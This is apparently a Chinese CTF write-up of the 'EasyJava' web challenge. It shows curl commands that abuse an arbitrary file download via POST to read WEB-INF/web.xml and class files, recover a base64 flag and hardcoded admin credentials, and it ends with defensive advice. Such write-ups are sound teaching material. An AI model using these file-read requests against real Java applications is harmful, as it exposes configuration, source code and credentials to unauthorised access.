---
title: CTF Writeup - EasyJava
date: 2026-05-13 12:00:00
categories:
  - CTF
  - Web
tags:
  - CTF
---


# CTF Writeup - EasyJava

## 基本信息

- **题目名称**: EasyJava
- **题目类型**: Web
- **目标URL**: http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login
- **完成状态**: ✅ 已解决

---

## 1. 信息收集与初步分析

### 1.1 访问目标网站

首先访问目标登录页面，观察页面结构：

```bash
curl -s "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login"
```

**页面特征分析**:
- 这是一个Java Web应用（由Tomcat服务器标识）
- 登录表单提交到 `/Login` 端点
- 页面底部有一个下载链接：`Download?filename=help.docx`
- 存在文件下载功能，可能存在**任意文件下载漏洞**

### 1.2 尝试常规渗透测试

**尝试SQL注入**:
```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login" \
  -d "username=admin' or '1'='1" \
  -d "password=admin' or '1'='1"
```
结果：返回 `wrong password!`，SQL注入不可行

**尝试默认凭据**:
```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login" \
  -d "username=admin" \
  -d "password=admin"
```
结果：同样失败

---

## 2. 漏洞发现 - 任意文件下载

### 2.1 漏洞原理

通过观察下载链接 `Download?filename=help.docx`，怀疑存在**任意文件下载/路径遍历漏洞**。

在Java Web应用中，常见的攻击向量包括：
- 尝试读取 `WEB-INF/web.xml` 获取应用配置
- 尝试读取 `.class` 文件获取源码信息
- 使用不同的HTTP方法（GET/POST）绕过限制

### 2.2 漏洞利用过程

**步骤1：尝试GET方式读取配置文件（失败）**
```bash
curl -s "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download?filename=WEB-INF/web.xml"
```
返回：`java.io.FileNotFoundException:{WEB-INF/web.xml}`

**步骤2：尝试POST方式读取（成功！）**
```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/web.xml"
```

**成功获取web.xml内容**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

### 2.3 关键信息提取

从 `web.xml` 中发现重要信息：

| Servlet名称 | 类路径 | URL映射 | 说明 |
|------------|--------|---------|------|
| IndexController | com.wm.ctf.IndexController | /Index | 首页控制器 |
| LoginController | com.wm.ctf.LoginController | /Login | 登录控制器 |
| DownloadController | com.wm.ctf.DownloadController | /Download | **存在漏洞的下载控制器** |
| **FlagController** | **com.wm.ctf.FlagController** | **/Flag** | **🎯 目标Flag控制器** |

---

## 3. 获取Flag

### 3.1 下载FlagController类文件

既然发现了 `FlagController`，尝试下载其编译后的 `.class` 文件：

```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/classes/com/wm/ctf/FlagController.class"
```

### 3.2 分析类文件内容

使用 `strings` 命令提取可打印字符串：
```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/classes/com/wm/ctf/FlagController.class" | strings
```

**在输出中发现可疑的Base64编码字符串**：
```
ZmxhZ3szNWI5OTA5Ny04YTAwLTQ2NjMtYmY1ZC1lM2E5MDYxYTEyNDZ9Cg==
```

### 3.3 解码获取Flag

```bash
echo 'ZmxhZ3szNWI5OTA5Ny04YTAwLTQ2NjMtYmY1ZC1lM2E5MDYxYTEyNDZ9Cg==' | base64 -d
```

**输出结果**：
```
flag{35b99097-8a00-4663-bf5d-e3a9061a1246}
```

---

## 4. 其他信息收集（补充）

### 4.1 登录控制器分析

```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/classes/com/wm/ctf/LoginController.class" | strings
```

发现硬编码凭据：
- **用户名**: `admin`
- **密码**: `admin888`

验证登录：
```bash
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login" \
  -d "username=admin" \
  -d "password=admin888"
```
结果：登录成功后会重定向到 index.jsp，但这不是获取flag的必要路径

### 4.2 下载控制器漏洞代码分析

通过分析 `DownloadController.class` 的字符串，发现代码逻辑：
```java
// 从请求参数获取文件名
String filename = request.getParameter("filename");

// 漏洞点：未对filename进行有效过滤
// 允许通过POST方法读取任意文件
```

**漏洞成因**：
1. 文件名参数 `filename` 未进行有效的路径过滤
2. 允许通过相对路径访问 `WEB-INF` 目录下的敏感文件
3. 虽然GET请求有限制，但POST请求可以绕过

---

## 5. 完整漏洞利用链

```
1. 访问登录页面 → 发现文件下载功能点
                ↓
2. 尝试GET方式读取web.xml → 失败
                ↓
3. 尝试POST方式读取web.xml → 成功，获取应用配置
                ↓
4. 从web.xml发现FlagController → 确认flag存储位置
                ↓
5. 下载FlagController.class → 获取编译后的类文件
                ↓
6. 分析class文件中的字符串 → 发现Base64编码的flag
                ↓
7. Base64解码 → 获取最终flag
```

---

## 6. 技术原理与知识点

### 6.1 Java Web应用结构
```
WEB-INF/
├── web.xml          # 应用配置文件
├── classes/         # 编译后的类文件
│   └── com/wm/ctf/  # 包结构
└── lib/            # 依赖库
```

### 6.2 任意文件下载漏洞
- **成因**: 未对用户提供的文件路径进行充分过滤
- **危害**: 可读取服务器上的敏感文件（配置、源码、数据库等）
- **防护**: 
  - 使用白名单限制可访问文件
  - 过滤 `../`、`..\` 等路径遍历字符
  - 避免直接使用用户输入拼接文件路径

### 6.3 Java字节码信息泄露
- `.class` 文件包含源代码中的字符串常量
- 可使用 `strings` 命令或反编译工具提取
- 敏感信息（flag、密钥、密码）不应硬编码

### 6.4 Base64编码识别
- 特征：由 `A-Z`、`a-z`、`0-9`、`+`、`/`、`=` 组成
- 填充符 `=` 通常出现在末尾
- 常用于编码二进制数据或隐藏敏感信息

---

## 7. Flag

```
flag{35b99097-8a00-4663-bf5d-e3a9061a1246}
```

---

## 8. 总结与反思

### 8.1 解题关键点
1. **细心观察**：页面底部的下载链接是突破口
2. **方法尝试**：GET失败时尝试POST方法
3. **知识储备**：了解Java Web应用结构和web.xml配置
4. **信息提取**：善用 `strings` 命令分析二进制文件

### 8.2 相关工具
- `curl`: HTTP请求工具
- `strings`: 提取可打印字符串
- `base64`: Base64编解码

### 8.3 扩展思路
- 可尝试读取 `WEB-INF/classes/` 下的其他类文件
- 可尝试读取数据库配置文件
- 可尝试反编译 `.class` 文件获取完整源码

---

## 附录：完整命令记录

```bash
# 1. 访问登录页面
curl -s "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Login"

# 2. 获取web.xml配置
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/web.xml"

# 3. 获取FlagController类文件并提取字符串
curl -s -X POST "http://4dcbff87-2347-4b33-aa54-67d3c672809d.node5.buuoj.cn:81/Download" \
  -d "filename=WEB-INF/classes/com/wm/ctf/FlagController.class" | strings

# 4. Base64解码获取flag
echo 'ZmxhZ3szNWI5OTA5Ny04YTAwLTQ2NjMtYmY1ZC1lM2E5MDYxYTEyNDZ9Cg==' | base64 -d
```

---

*Writeup completed on 2026-05-13*
